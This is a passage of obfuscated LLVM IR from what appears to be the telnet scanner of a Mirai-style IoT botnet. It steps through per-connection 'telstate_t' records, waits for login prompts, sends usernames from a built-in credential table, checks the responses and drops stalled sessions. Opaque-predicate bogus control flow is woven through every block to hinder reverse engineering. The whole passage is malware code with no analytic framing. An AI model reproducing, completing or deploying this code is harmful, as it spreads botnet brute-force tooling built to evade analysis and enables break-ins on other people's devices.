  %727 = urem i32 %726, 2
  %728 = icmp eq i32 %727, 0
  %729 = icmp slt i32 %724, 10
  %730 = or i1 %728, %729
  br i1 %730, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %3344

; <label>:731:                                    ; preds = %632
  %732 = load i32, i32* %10, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %733
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %734, i32 0, i32 0
  %736 = load i32, i32* %735, align 16
  %737 = load i32, i32* %10, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 8
  %741 = load i8*, i8** %740, align 8
  %742 = load i32, i32* %10, align 4
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %743
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %744, i32 0, i32 7
  %746 = load i16, i16* %745, align 16
  %747 = zext i16 %746 to i32
  %748 = call i32 @readUntil(i32 %736, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %741, i32 1024, i32 %747)
  %749 = icmp ne i32 %748, 0
  br i1 %749, label %750, label %798

; <label>:750:                                    ; preds = %731
  %751 = load i32, i32* %10, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %752
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %753, i32 0, i32 6
  store i32 0, i32* %754, align 4
  %755 = load i32, i32* %10, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %756
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %757, i32 0, i32 7
  store i16 0, i16* %758, align 16
  %759 = load i32, i32* %10, align 4
  %760 = sext i32 %759 to i64
  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 8
  %763 = load i8*, i8** %762, align 8
  %764 = call i8* @strstr(i8* %763, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %765 = icmp ne i8* %764, null
  br i1 %765, label %766, label %787

; <label>:766:                                    ; preds = %750
  %767 = load i32, i32* @x.67
  %768 = load i32, i32* @y.68
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %766
  %775 = load i32, i32* %10, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 2
  store i8 5, i8* %778, align 8
  %779 = load i32, i32* @x.67
  %780 = load i32, i32* @y.68
  %781 = sub i32 %779, 1
  %782 = mul i32 %779, %781
  %783 = urem i32 %782, 2
  %784 = icmp eq i32 %783, 0
  %785 = icmp slt i32 %780, 10
  %786 = or i1 %784, %785
  br i1 %786, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br label %793

; <label>:787:                                    ; preds = %750
  %788 = load i32, i32* %10, align 4
  %789 = sext i32 %788 to i64
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %789
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %790, i32 0, i32 8
  %792 = load i8*, i8** %791, align 8
  call void @llvm.memset.p0i8.i64(i8* %792, i8 0, i64 1024, i32 1, i1 false)
  br label %793

; <label>:793:                                    ; preds = %787, %originalBBpart2119
  %794 = load i32, i32* %10, align 4
  %795 = sext i32 %794 to i64
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %795
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %796, i32 0, i32 2
  store i8 3, i8* %797, align 8
  br label %3344

; <label>:798:                                    ; preds = %731
  %799 = load i32, i32* %10, align 4
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %800
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %801, i32 0, i32 0
  %803 = load i32, i32* %802, align 16
  %804 = load i32, i32* %10, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %805
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %806, i32 0, i32 8
  %808 = load i8*, i8** %807, align 8
  %809 = load i32, i32* %10, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 7
  %813 = load i16, i16* %812, align 16
  %814 = zext i16 %813 to i32
  %815 = call i32 @readUntil(i32 %803, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %808, i32 1024, i32 %814)
  %816 = icmp ne i32 %815, 0
  br i1 %816, label %817, label %865

; <label>:817:                                    ; preds = %798
  %818 = load i32, i32* %10, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %819
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %820, i32 0, i32 6
  store i32 0, i32* %821, align 4
  %822 = load i32, i32* %10, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 7
  store i16 0, i16* %825, align 16
  %826 = load i32, i32* %10, align 4
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %827
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %828, i32 0, i32 8
  %830 = load i8*, i8** %829, align 8
  %831 = call i8* @strstr(i8* %830, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %832 = icmp ne i8* %831, null
  br i1 %832, label %833, label %854

; <label>:833:                                    ; preds = %817
  %834 = load i32, i32* @x.67
  %835 = load i32, i32* @y.68
  %836 = sub i32 %834, 1
  %837 = mul i32 %834, %836
  %838 = urem i32 %837, 2
  %839 = icmp eq i32 %838, 0
  %840 = icmp slt i32 %835, 10
  %841 = or i1 %839, %840
  br i1 %841, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %833
  %842 = load i32, i32* %10, align 4
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %843
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %844, i32 0, i32 2
  store i8 5, i8* %845, align 8
  %846 = load i32, i32* @x.67
  %847 = load i32, i32* @y.68
  %848 = sub i32 %846, 1
  %849 = mul i32 %846, %848
  %850 = urem i32 %849, 2
  %851 = icmp eq i32 %850, 0
  %852 = icmp slt i32 %847, 10
  %853 = or i1 %851, %852
  br i1 %853, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br label %860

; <label>:854:                                    ; preds = %817
  %855 = load i32, i32* %10, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %856
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %857, i32 0, i32 8
  %859 = load i8*, i8** %858, align 8
  call void @llvm.memset.p0i8.i64(i8* %859, i8 0, i64 1024, i32 1, i1 false)
  br label %860

; <label>:860:                                    ; preds = %854, %originalBBpart2123
  %861 = load i32, i32* %10, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 2
  store i8 3, i8* %864, align 8
  br label %3344

; <label>:865:                                    ; preds = %798
  %866 = load i32, i32* @x.67
  %867 = load i32, i32* @y.68
  %868 = sub i32 %866, 1
  %869 = mul i32 %866, %868
  %870 = urem i32 %869, 2
  %871 = icmp eq i32 %870, 0
  %872 = icmp slt i32 %867, 10
  %873 = or i1 %871, %872
  br i1 %873, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %865
  %874 = load i32, i32* %10, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %875
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %876, i32 0, i32 0
  %878 = load i32, i32* %877, align 16
  %879 = load i32, i32* %10, align 4
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %880
  %882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %881, i32 0, i32 8
  %883 = load i8*, i8** %882, align 8
  %884 = load i32, i32* %10, align 4
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %885
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %886, i32 0, i32 7
  %888 = load i16, i16* %887, align 16
  %889 = zext i16 %888 to i32
  %890 = call i32 @readUntil(i32 %878, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %883, i32 1024, i32 %889)
  %891 = icmp ne i32 %890, 0
  %892 = load i32, i32* @x.67
  %893 = load i32, i32* @y.68
  %894 = sub i32 %892, 1
  %895 = mul i32 %892, %894
  %896 = urem i32 %895, 2
  %897 = icmp eq i32 %896, 0
  %898 = icmp slt i32 %893, 10
  %899 = or i1 %897, %898
  br i1 %899, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br i1 %891, label %900, label %964

; <label>:900:                                    ; preds = %originalBBpart2127
  %901 = load i32, i32* %10, align 4
  %902 = sext i32 %901 to i64
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %902
  %904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %903, i32 0, i32 6
  store i32 0, i32* %904, align 4
  %905 = load i32, i32* %10, align 4
  %906 = sext i32 %905 to i64
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %906
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %907, i32 0, i32 7
  store i16 0, i16* %908, align 16
  %909 = load i32, i32* %10, align 4
  %910 = sext i32 %909 to i64
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %910
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %911, i32 0, i32 8
  %913 = load i8*, i8** %912, align 8
  %914 = call i8* @strstr(i8* %913, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %915 = icmp ne i8* %914, null
  br i1 %915, label %916, label %937

; <label>:916:                                    ; preds = %900
  %917 = load i32, i32* @x.67
  %918 = load i32, i32* @y.68
  %919 = sub i32 %917, 1
  %920 = mul i32 %917, %919
  %921 = urem i32 %920, 2
  %922 = icmp eq i32 %921, 0
  %923 = icmp slt i32 %918, 10
  %924 = or i1 %922, %923
  br i1 %924, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %916
  %925 = load i32, i32* %10, align 4
  %926 = sext i32 %925 to i64
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %926
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %927, i32 0, i32 2
  store i8 5, i8* %928, align 8
  %929 = load i32, i32* @x.67
  %930 = load i32, i32* @y.68
  %931 = sub i32 %929, 1
  %932 = mul i32 %929, %931
  %933 = urem i32 %932, 2
  %934 = icmp eq i32 %933, 0
  %935 = icmp slt i32 %930, 10
  %936 = or i1 %934, %935
  br i1 %936, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br label %959

; <label>:937:                                    ; preds = %900
  %938 = load i32, i32* @x.67
  %939 = load i32, i32* @y.68
  %940 = sub i32 %938, 1
  %941 = mul i32 %938, %940
  %942 = urem i32 %941, 2
  %943 = icmp eq i32 %942, 0
  %944 = icmp slt i32 %939, 10
  %945 = or i1 %943, %944
  br i1 %945, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %937
  %946 = load i32, i32* %10, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %947
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %948, i32 0, i32 8
  %950 = load i8*, i8** %949, align 8
  call void @llvm.memset.p0i8.i64(i8* %950, i8 0, i64 1024, i32 1, i1 false)
  %951 = load i32, i32* @x.67
  %952 = load i32, i32* @y.68
  %953 = sub i32 %951, 1
  %954 = mul i32 %951, %953
  %955 = urem i32 %954, 2
  %956 = icmp eq i32 %955, 0
  %957 = icmp slt i32 %952, 10
  %958 = or i1 %956, %957
  br i1 %958, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br label %959

; <label>:959:                                    ; preds = %originalBBpart2135, %originalBBpart2131
  %960 = load i32, i32* %10, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %961
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %962, i32 0, i32 2
  store i8 3, i8* %963, align 8
  br label %3344

; <label>:964:                                    ; preds = %originalBBpart2127
  %965 = load i32, i32* @x.67
  %966 = load i32, i32* @y.68
  %967 = sub i32 %965, 1
  %968 = mul i32 %965, %967
  %969 = urem i32 %968, 2
  %970 = icmp eq i32 %969, 0
  %971 = icmp slt i32 %966, 10
  %972 = or i1 %970, %971
  br i1 %972, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %964
  %973 = load i32, i32* %10, align 4
  %974 = sext i32 %973 to i64
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %974
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %975, i32 0, i32 8
  %977 = load i8*, i8** %976, align 8
  %978 = call i64 @strlen(i8* %977) #10
  %979 = trunc i64 %978 to i16
  %980 = load i32, i32* %10, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %981
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %982, i32 0, i32 7
  store i16 %979, i16* %983, align 16
  %984 = load i32, i32* @x.67
  %985 = load i32, i32* @y.68
  %986 = sub i32 %984, 1
  %987 = mul i32 %984, %986
  %988 = urem i32 %987, 2
  %989 = icmp eq i32 %988, 0
  %990 = icmp slt i32 %985, 10
  %991 = or i1 %989, %990
  br i1 %991, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %992

; <label>:992:                                    ; preds = %originalBBpart2139
  br label %993

; <label>:993:                                    ; preds = %992
  %994 = load i32, i32* @x.67
  %995 = load i32, i32* @y.68
  %996 = sub i32 %994, 1
  %997 = mul i32 %994, %996
  %998 = urem i32 %997, 2
  %999 = icmp eq i32 %998, 0
  %1000 = icmp slt i32 %995, 10
  %1001 = or i1 %999, %1000
  br i1 %1001, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %993
  %1002 = load i32, i32* @x.67
  %1003 = load i32, i32* @y.68
  %1004 = sub i32 %1002, 1
  %1005 = mul i32 %1002, %1004
  %1006 = urem i32 %1005, 2
  %1007 = icmp eq i32 %1006, 0
  %1008 = icmp slt i32 %1003, 10
  %1009 = or i1 %1007, %1008
  br i1 %1009, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br label %1010

; <label>:1010:                                   ; preds = %originalBBpart2143
  br label %1011

; <label>:1011:                                   ; preds = %1010
  br label %1012

; <label>:1012:                                   ; preds = %1011
  %1013 = load i32, i32* @x.67
  %1014 = load i32, i32* @y.68
  %1015 = sub i32 %1013, 1
  %1016 = mul i32 %1013, %1015
  %1017 = urem i32 %1016, 2
  %1018 = icmp eq i32 %1017, 0
  %1019 = icmp slt i32 %1014, 10
  %1020 = or i1 %1018, %1019
  br i1 %1020, label %originalBB145, label %originalBB145alteredBB

originalBB145:                                    ; preds = %originalBB145alteredBB, %1012
  %1021 = load i32, i32* %10, align 4
  %1022 = sext i32 %1021 to i64
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1022
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1023, i32 0, i32 6
  %1025 = load i32, i32* %1024, align 4
  %1026 = add i32 %1025, 10
  %1027 = zext i32 %1026 to i64
  %1028 = call i64 @time(i64* null) #2
  %1029 = icmp slt i64 %1027, %1028
  %1030 = load i32, i32* @x.67
  %1031 = load i32, i32* @y.68
  %1032 = sub i32 %1030, 1
  %1033 = mul i32 %1030, %1032
  %1034 = urem i32 %1033, 2
  %1035 = icmp eq i32 %1034, 0
  %1036 = icmp slt i32 %1031, 10
  %1037 = or i1 %1035, %1036
  br i1 %1037, label %originalBBpart2155, label %originalBB145alteredBB

originalBBpart2155:                               ; preds = %originalBB145
  br i1 %1029, label %1038, label %1053

; <label>:1038:                                   ; preds = %originalBBpart2155
  %1039 = load i32, i32* %10, align 4
  %1040 = sext i32 %1039 to i64
  %1041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1040
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1041, i32 0, i32 0
  %1043 = load i32, i32* %1042, align 16
  %1044 = call i32 @sclose(i32 %1043)
  %1045 = load i32, i32* %10, align 4
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1046
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1047, i32 0, i32 2
  store i8 0, i8* %1048, align 8
  %1049 = load i32, i32* %10, align 4
  %1050 = sext i32 %1049 to i64
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1050
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1051, i32 0, i32 3
  store i8 1, i8* %1052, align 1
  br label %1053

; <label>:1053:                                   ; preds = %1038, %originalBBpart2155
  %1054 = load i32, i32* @x.67
  %1055 = load i32, i32* @y.68
  %1056 = sub i32 %1054, 1
  %1057 = mul i32 %1054, %1056
  %1058 = urem i32 %1057, 2
  %1059 = icmp eq i32 %1058, 0
  %1060 = icmp slt i32 %1055, 10
  %1061 = or i1 %1059, %1060
  br i1 %1061, label %originalBB157, label %originalBB157alteredBB

originalBB157:                                    ; preds = %originalBB157alteredBB, %1053
  %1062 = load i32, i32* @x.67
  %1063 = load i32, i32* @y.68
  %1064 = sub i32 %1062, 1
  %1065 = mul i32 %1062, %1064
  %1066 = urem i32 %1065, 2
  %1067 = icmp eq i32 %1066, 0
  %1068 = icmp slt i32 %1063, 10
  %1069 = or i1 %1067, %1068
  br i1 %1069, label %originalBBpart2159, label %originalBB157alteredBB

originalBBpart2159:                               ; preds = %originalBB157
  br label %3327

; <label>:1070:                                   ; preds = %101
  %1071 = load i32, i32* %10, align 4
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1072
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1073, i32 0, i32 0
  %1075 = load i32, i32* %1074, align 16
  %1076 = load i32, i32* %10, align 4
  %1077 = sext i32 %1076 to i64
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1077
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1078, i32 0, i32 4
  %1080 = load i8, i8* %1079, align 2
  %1081 = zext i8 %1080 to i64
  %1082 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %1081
  %1083 = load i8*, i8** %1082, align 8
  %1084 = load i32, i32* %10, align 4
  %1085 = sext i32 %1084 to i64
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1085
  %1087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1086, i32 0, i32 4
  %1088 = load i8, i8* %1087, align 2
  %1089 = zext i8 %1088 to i64
  %1090 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %1089
  %1091 = load i8*, i8** %1090, align 8
  %1092 = call i64 @strlen(i8* %1091) #10
  %1093 = call i64 @send(i32 %1075, i8* %1083, i64 %1092, i32 16384)
  %1094 = icmp slt i64 %1093, 0
  br i1 %1094, label %1095, label %1110

; <label>:1095:                                   ; preds = %1070
  %1096 = load i32, i32* %10, align 4
  %1097 = sext i32 %1096 to i64
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1097
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1098, i32 0, i32 0
  %1100 = load i32, i32* %1099, align 16
  %1101 = call i32 @sclose(i32 %1100)
  %1102 = load i32, i32* %10, align 4
  %1103 = sext i32 %1102 to i64
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1103
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1104, i32 0, i32 2
  store i8 0, i8* %1105, align 8
  %1106 = load i32, i32* %10, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1107
  %1109 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1108, i32 0, i32 3
  store i8 1, i8* %1109, align 1
  br label %3344

; <label>:1110:                                   ; preds = %1070
  %1111 = load i32, i32* %10, align 4
  %1112 = sext i32 %1111 to i64
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1112
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1113, i32 0, i32 0
  %1115 = load i32, i32* %1114, align 16
  %1116 = call i64 @send(i32 %1115, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1117 = icmp slt i64 %1116, 0
  br i1 %1117, label %1118, label %1133

; <label>:1118:                                   ; preds = %1110
  %1119 = load i32, i32* %10, align 4
  %1120 = sext i32 %1119 to i64
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1120
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1121, i32 0, i32 0
  %1123 = load i32, i32* %1122, align 16
  %1124 = call i32 @sclose(i32 %1123)
  %1125 = load i32, i32* %10, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1126
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1127, i32 0, i32 2
  store i8 0, i8* %1128, align 8
  %1129 = load i32, i32* %10, align 4
  %1130 = sext i32 %1129 to i64
  %1131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1130
  %1132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1131, i32 0, i32 3
  store i8 1, i8* %1132, align 1
  br label %3344

; <label>:1133:                                   ; preds = %1110
  %1134 = load i32, i32* %10, align 4
  %1135 = sext i32 %1134 to i64
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1135
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1136, i32 0, i32 2
  store i8 4, i8* %1137, align 8
  br label %3327

; <label>:1138:                                   ; preds = %101
  %1139 = load i32, i32* %10, align 4
  %1140 = sext i32 %1139 to i64
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1140
  %1142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1141, i32 0, i32 6
  %1143 = load i32, i32* %1142, align 4
  %1144 = icmp eq i32 %1143, 0
  br i1 %1144, label %1145, label %1152

; <label>:1145:                                   ; preds = %1138
  %1146 = call i64 @time(i64* null) #2
  %1147 = trunc i64 %1146 to i32
  %1148 = load i32, i32* %10, align 4
  %1149 = sext i32 %1148 to i64
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1149
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1150, i32 0, i32 6
  store i32 %1147, i32* %1151, align 4
  br label %1152

; <label>:1152:                                   ; preds = %1145, %1138
  %1153 = load i32, i32* %10, align 4
  %1154 = sext i32 %1153 to i64
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1154
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1155, i32 0, i32 0
  %1157 = load i32, i32* %1156, align 16
  %1158 = load i32, i32* %10, align 4
  %1159 = sext i32 %1158 to i64
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1159
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1160, i32 0, i32 8
  %1162 = load i8*, i8** %1161, align 8
  %1163 = load i32, i32* %10, align 4
  %1164 = sext i32 %1163 to i64
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1164
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1165, i32 0, i32 7
  %1167 = load i16, i16* %1166, align 16
  %1168 = zext i16 %1167 to i32
  %1169 = call i32 @readUntil(i32 %1157, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1162, i32 1024, i32 %1168)
  %1170 = icmp ne i32 %1169, 0
  br i1 %1170, label %1171, label %1219

; <label>:1171:                                   ; preds = %1152
  %1172 = load i32, i32* %10, align 4
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1173
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1174, i32 0, i32 6
  store i32 0, i32* %1175, align 4
  %1176 = load i32, i32* %10, align 4
  %1177 = sext i32 %1176 to i64
  %1178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1177
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1178, i32 0, i32 7
  store i16 0, i16* %1179, align 16
  %1180 = load i32, i32* %10, align 4
  %1181 = sext i32 %1180 to i64
  %1182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1181
  %1183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1182, i32 0, i32 8
  %1184 = load i8*, i8** %1183, align 8
  %1185 = call i8* @strstr(i8* %1184, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0)) #10
  %1186 = icmp ne i8* %1185, null
  br i1 %1186, label %1187, label %1192

; <label>:1187:                                   ; preds = %1171
  %1188 = load i32, i32* %10, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 2
  store i8 5, i8* %1191, align 8
  br label %1197

; <label>:1192:                                   ; preds = %1171
  %1193 = load i32, i32* %10, align 4
  %1194 = sext i32 %1193 to i64
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 2
  store i8 7, i8* %1196, align 8
  br label %1197

; <label>:1197:                                   ; preds = %1192, %1187
  %1198 = load i32, i32* @x.67
  %1199 = load i32, i32* @y.68
  %1200 = sub i32 %1198, 1
  %1201 = mul i32 %1198, %1200
  %1202 = urem i32 %1201, 2
  %1203 = icmp eq i32 %1202, 0
  %1204 = icmp slt i32 %1199, 10
  %1205 = or i1 %1203, %1204
  br i1 %1205, label %originalBB161, label %originalBB161alteredBB

originalBB161:                                    ; preds = %originalBB161alteredBB, %1197
  %1206 = load i32, i32* %10, align 4
  %1207 = sext i32 %1206 to i64
  %1208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1207
  %1209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1208, i32 0, i32 8
  %1210 = load i8*, i8** %1209, align 8
  call void @llvm.memset.p0i8.i64(i8* %1210, i8 0, i64 1024, i32 1, i1 false)
  %1211 = load i32, i32* @x.67
  %1212 = load i32, i32* @y.68
  %1213 = sub i32 %1211, 1
  %1214 = mul i32 %1211, %1213
  %1215 = urem i32 %1214, 2
  %1216 = icmp eq i32 %1215, 0
  %1217 = icmp slt i32 %1212, 10
